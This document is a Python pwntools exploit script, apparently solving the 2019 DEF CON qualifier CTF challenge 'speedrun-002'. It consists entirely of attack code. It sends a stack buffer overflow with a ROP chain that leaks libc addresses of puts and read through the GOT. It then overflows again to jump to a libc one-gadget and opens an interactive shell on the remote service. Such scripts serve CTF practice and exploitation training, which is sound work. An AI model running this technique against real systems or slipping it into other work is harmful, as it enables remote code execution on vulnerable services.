from pwn import *

conn = remote("speedrun-002.quals2019.oooverflow.io", 31337)
#conn = process("./speedrun-002")

def trigger_bof(payload):
	conn.recvuntil("What say you now?")
	conn.sendline(payload)
	
payload  = "Everything intelligent is so boring.\x00"
trigger_bof(payload)

pop_rdi = 0x004008a3
pop_rsi_r15 = 0x004008a1
pop_rdx = 0x004006ec

puts_plt = 0x4005b0

puts_got = 0x601028
read_got = 0x601040
main = 0x04007CE


# leak puts and read address
conn.recvuntil("Tell me more.")
payload = "A"*0x400
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main)

conn.sendline(payload)
conn.recvuntil("Fascinating.\n")

#leak
puts_addr = u64(conn.recv(6).ljust(8, "\x00"))
conn.recvline()
read_addr = u64(conn.recv(6).ljust(8, "\x00"))
log.info("puts_addr : "+hex(puts_addr))
log.info("read_addr : "+hex(read_addr))

payload  = "Everything intelligent is so boring.\x00"
trigger_bof(payload)

# go to oneshot
oneshot = puts_addr-0x809c0 + 0x4f322 # 0x4f322 0x10a38c

conn.recvuntil("Tell me more.")
payload = "A"*0x400
payload += p64(0xdeadbeef)
payload += p64(oneshot)
payload += "\x00"*100

conn.sendline(payload)


conn.interactive()